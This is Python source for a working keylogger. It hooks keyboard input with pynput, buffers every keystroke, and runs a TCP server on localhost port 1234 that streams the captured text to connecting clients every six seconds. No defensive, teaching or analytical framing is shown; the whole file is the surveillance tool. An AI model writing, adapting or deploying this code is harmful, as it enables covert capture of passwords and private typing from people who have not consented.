import socket
import threading
import time
from pynput.keyboard import Key
from pynput.keyboard import Listener

keystrokes = ""
keystrokes_lock = threading.Lock()

def on_key_press(key):
    global keystrokes  # Accessing the global keystrokes variable
    try:
        with keystrokes_lock:  # Acquiring the lock to safely modify keystrokes
            if key == Key.space:  # Check if the pressed key is space
                keystrokes += " "  # Append space to keystrokes
            elif key == Key.backspace:  # Check if the pressed key is backspace
                keystrokes = keystrokes[:-2]  # Remove last two characters from keystrokes (usually intended for one character removal)
            elif hasattr(key, 'char') and key.char is not None:  # Check if the key has a character attribute
                keystrokes += key.char  # Append the character to keystrokes
    except Exception as e:
        print(f"Error in key press listener: {e}")  # Print any exceptions that occur during key press handling

def send_keystrokes_to_clients():
    global keystrokes  # Accessing the global keystrokes variable
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create TCP socket
    server_socket.bind(("127.0.0.1", 1234))  # Bind socket to localhost on port 1234
    server_socket.listen(3)  # Listen for incoming connections with a backlog of 3
    print("Server listening on 127.0.0.1:1234")  # Print message indicating server is listening

    try:
        while True:
            client_socket, client_address = server_socket.accept()  # Accept incoming client connection
            print(f"Connection established from {client_address}")  # Print client connection information

            while True:
                with keystrokes_lock:  # Acquire lock to safely access keystrokes
                    if keystrokes:  # Check if keystrokes is not empty
                        client_socket.send(bytes(keystrokes, "utf-8"))  # Send encoded keystrokes to client
                        keystrokes = ""  # Clear keystrokes after sending
                time.sleep(6)  # Sleep for 6 seconds before checking for new keystrokes
    except Exception as e:
        print(f"Error in send keystrokes function: {e}")  # Print any exceptions that occur during keystroke sending
    finally:
        server_socket.close()  # Close the server socket when done

# Thread for sending keystrokes to clients
send_thread = threading.Thread(target=send_keystrokes_to_clients)  # Create thread for send_keystrokes_to_clients function
send_thread.start()  # Start the thread to send keystrokes asynchronously

# Listener for capturing keystrokes
with Listener(on_press=on_key_press) as listener:  # Create a listener to capture key presses
    listener.join()  # Wait for the listener thread to terminate (which should never happen in this code)
